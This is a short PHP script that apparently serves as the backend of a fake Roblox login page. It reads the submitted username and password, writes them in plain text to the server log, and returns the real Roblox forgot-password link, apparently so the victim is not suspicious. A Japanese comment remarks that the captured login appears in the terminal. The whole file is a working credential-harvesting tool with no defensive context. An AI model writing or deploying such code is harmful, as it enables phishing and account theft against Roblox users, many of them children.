<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $u = $_POST["username"] ?? 'none';
    $p = $_POST["password"] ?? 'none';

    $log = "login: $u / pass: $p\n";

    error_log($log); // ← これがターミナルに出力される！

    echo "https://www.roblox.com/ja/login/forgot-password-or-username";
}
?>
